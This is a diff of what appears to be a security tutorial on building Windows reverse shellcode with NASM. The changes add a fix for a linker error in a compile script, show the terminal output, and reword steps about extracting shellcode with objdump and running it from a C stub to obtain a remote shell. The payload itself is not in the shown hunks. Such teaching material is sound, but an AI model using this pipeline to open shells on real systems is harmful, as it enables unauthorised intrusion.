@@ -1066,8 +1066,7 @@ The above code will be saved inside a file named <code  style="background-color:
 The following bash script <code  style="background-color: lightgrey; color:black;"><b>compile.sh</b></code> will be used for compilation and linking 
 </p>
 
-
-```bash
+```
 #!/bin/bash
 
 echo '[+] Assembling with Nasm ... '
@@ -1080,7 +1079,53 @@ echo '[+] Done!'
 ```
 
 <p align="justify">
-Then the shellcode will be produced as follows : 
+In case the execution of the <code  style="background-color: lightgrey; color:black;"><b>compile.sh</b></code> above produces the following output and linking error 
+</p>
+
+
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+──(root㉿kali)-[/home/kali/Desktop]
+└─# ./compile.sh rev
+[+] Assembling with Nasm ...
+[+] Linking ...
+<code><b><span style="color:red">ld: i386 architecture of input file `rev.obj' is incompatible with i386:x86-64 output</span></b></code>
+[+] Done!
+</pre>
+
+<p align="justify">
+Then alter the line that performs the linking with <code  style="background-color: lightgrey; color:black;"><b>ld</b></code> command with the following 
+</p>
+
+
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+#!/bin/bash
+
+echo '[+] Assembling with Nasm ... '
+nasm -f win32 $1.nasm -o $1.obj
+
+echo '[+] Linking ...'
+<code><b><span style="color:red">ld -m elf_i386 -s  -o $1.exe $1.obj</span></b></code>
+
+echo '[+] Done!'
+
+</pre>
+
+
+<p align="justify">
+Then run the <code style="background-color: lightgrey; color:black;"><b>compile.sh</b></code> again
+</p>
+
+```
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# ./compile.sh rev
+[+] Assembling with Nasm ...
+[+] Linking ...
+[+] Done!
+
+```
+
+<p align="justify">
+At this point we use <code style="background-color: lightgrey; color:black;"><b>objectdump</b></code> in order to produce the shellcode: 
 </p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
@@ -1089,7 +1134,7 @@ kali@kali:~/Desktop$ objdump -d ./testasm.exe|grep '[0-9a-f]:'|grep -v 'file'|cu
 </pre>
 
 <p align="justify">
-At this point, in order to execute the above shellcode, we should create a STUB program in C which will deliver the execution. The following program will execute the reverse shellcode. 
+In order to execute the above shellcode, we should create a STUB program in C which will deliver the execution. The following program will execute the reverse shellcode. 
 </p>
 
 
@@ -1139,7 +1184,7 @@ int main(int argc, char** argv)
 
 
 <p align="justify">
-After compiling and running the above program we will have a fancy shell on our kali machine as seen at the screenshot below 
+After compiling and running the above program we will have command execution on our kali machine as seen at the screenshot below 
 </p>
 
 
